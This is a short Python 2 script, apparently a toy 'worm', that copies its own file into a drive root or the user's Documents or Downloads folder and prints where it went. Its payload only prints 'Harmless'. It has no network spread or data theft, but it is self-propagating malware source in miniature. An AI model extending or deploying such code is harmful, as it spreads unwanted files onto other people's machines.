from shutil import copyfile
import os, getpass



def payload():
	print"Harmless"	


def propagate():
	#gets the current location of the worm
	src=os.path.abspath("worm.py")
	#gets the username of the linux user
	usr=getpass.getuser()

	#checks for E:/ drive on windows
	if(os.path.isdir("E:/")):
		#saves location
		dst="E:/"+"worm.py"

	#checks for Documents folder in Linux
	elif(os.path.isdir("/home/"+usr+"/Documents/")):
		#saves location
		dst="/home/"+usr+"/Documents/"+"worm.py"

	#checks for C:/ drive on windows
	elif(os.path.isdir("C:/")):
		#saves location
		dst="C:/"+"worm.py"

	#checks for Downloads folder in Linux
	elif(os.path.isdir("/home/"+usr+"/Downloads/")):
		#saves location
		dst="/home/"+usr+"/Downloads/"+"worm.py"
	
	else:
		#save location of current directory		
		dst=os.getcwd()+"/worm1.py"

	#Copies file to new location	
	copyfile(src,dst)

	print "Worm Location"
	print "dst: "+dst
	print "src: "+src

propagate()

